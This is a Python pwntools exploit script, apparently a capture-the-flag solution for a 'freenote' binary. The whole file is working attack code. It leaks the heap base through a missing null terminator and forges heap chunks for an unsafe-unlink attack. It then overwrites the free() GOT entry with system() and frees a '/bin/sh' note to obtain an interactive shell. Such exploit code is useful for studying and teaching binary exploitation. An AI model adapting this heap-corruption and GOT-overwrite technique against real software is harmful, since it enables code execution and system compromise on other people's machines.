#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *

e = pwnlib.elf.ELF('./freenote')
GOT_FREE = e.got['free']

#pwnlib.context.context.log_level = 'debug'
pwnlib.context.context.arch = 'amd64'
p = process('./freenote')

LEAK_FOR_BASE = 'A' * (128 + 16)   # size:128, chunk_prevsize:8, chunk_size:8

def get_heap_base():
    #def list_note(note_index):
    #p.clean()
    #p.newline='\n'
    p.sendline('1') # list_note()
    #p.recvuntil('%d. ' % note_index)
    #print 'xxx'
    #print p.recvline(keepends=False)
    p.recvuntil(LEAK_FOR_BASE)
    return u64(p.recvline(keepends=False).ljust(8, '\x00')[:8]) - (0x1810 + 0x10)  # eq. chunk_0_address - (notes_size + notes->prev_size & notes->size) = heap_base_address

def new_note(content):
    p.sendline('2')
    p.sendline(str(len(content)))
    p.sendline(content)

def edit_note(note_index, content):
    p.sendline('3')
    p.sendline(str(note_index))
    p.sendline(str(len(content)))
    p.sendline(content)

def delete_note(note_index):
    p.sendline('4')
    p.sendline(str(note_index))

def get_free():
    p.sendline('1')
    p.clean(timeout=0)
    p.recvuntil('0. ')
    return u64(p.recvline(keepends=False).ljust(8, '\x00')[:8])

for i in xrange(4):
    new_note('A')
delete_note('0')    # chunk_0 add to bin
delete_note('2')    # now chunk_2's fd points to chunk_0, so chunk_2->fd is chunk_0's address
# Because no '\x00' would be appended after edit the note's content, we can overwrite next chunk's data.
edit_note(1, LEAK_FOR_BASE) # use 'A'*(128+16) overwrite chunk_2->prev_size & chunk_2->size with 'A'*16
# now we can get the heap base by using list_note function
heap_base = get_heap_base()
#list_note(0)
delete_note('1')
# delete_note() only set the used_flag from 1 to 2, the content address is remained on the heap.
delete_note('3')
FAKE_CHUNK_0_SIZE = 0x80 + 0x90 + 0x90  # note_0:0x80, note_1:0x90, note_2:0x90
new_note(p64(0)+p64(FAKE_CHUNK_0_SIZE+1)+p64(heap_base+0x18)+p64(heap_base+0x20))
#        |- prev_size     size                 fd                     bk     -|
#        |-                         fake chunk_0                             ...
new_note('/bin/sh\x00')
new_note('A'*0x80+p64(FAKE_CHUNK_0_SIZE)+p64(0x90)+'A'*0x80+p64(0)+p64(0x91)+'A'*0x80+p64(0)+p64(0x91)+'A'*0x80)
#       ...    -| |-             fake chunk_1            -| |-    fake chunk_2     -| |-    fake chunk_3     -|
delete_note('3')
#GOT_FREE = 0x602018
LIBC_FREE_RVA = 0x82df0
LIBC_SYSTEM_RVA = 0x46640
#LIBC_SYSTEM_RVA = 0x414f0
edit_note(0, p64(4)+p64(1)+p64(8)+p64(GOT_FREE))
free_address = get_free()
print hex(free_address)
system_address = free_address - LIBC_FREE_RVA + LIBC_SYSTEM_RVA
print hex(system_address)
edit_note(0, p64(system_address))
delete_note(1)
p.clean()
p.interactive()

